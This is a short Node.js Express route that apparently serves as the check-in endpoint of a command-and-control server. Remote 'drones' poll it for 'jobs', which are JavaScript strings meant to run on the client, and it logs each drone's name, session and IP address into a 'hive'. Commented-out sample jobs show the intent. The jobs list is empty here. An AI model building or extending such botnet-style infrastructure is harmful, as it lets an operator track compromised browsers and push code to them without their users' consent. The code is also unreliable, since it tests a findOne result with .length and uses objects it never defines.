var express = require('express');
var router = express.Router();
var path = require('path');

router.get('/', function (req, res) {
    //res.sendFile('interlink.js', {root: path.join(__dirname, '../modules')});
    //res.write('OK');
    var response = {};
    response.session = req.sessionID;
    response.jobs = [];
    //response.jobs.push('console.log("WORKS!");');
    //response.jobs.push('alert("Master I am here to server you!")');
    //res.json("OK");
    res.json(response);
    //console.log('[interLink] Request from :' + req.sessionID);
    //console.log(req.params);
    //console.log(req.param('d'));
    //console.log(db);
    //console.log(req.session);

    //console.log(drones);

    var remoteAddress = (req.headers['x-forwarded-for'] || req.connection.remoteAddress);

    var droneData = drones.findOne({'name': req.param('d')});
    if (droneData.length == 0) {
        console.log("Adding drone ...");
        drones.insert({
            name: req.param('d'),
            session: req.sessionID,
            timestamp: new Date().toString(),
            remoteAddress: remoteAddress
        });

        //drones.save();
        hive.save(function () {
            console.log("Wrote HIVE to disk!")
        });
    } else {
        droneData.timestamp = new Date().toString();
        droneData.session = req.sessionID;
        droneData.remoteAddress = remoteAddress;
        // console.log("Drone already known ...");
        hive.save(function () {
            console.log("Wrote HIVE to disk!")
        });
    }
    //console.log(droneData.length);
//console.log(fooo);
});

module.exports = router;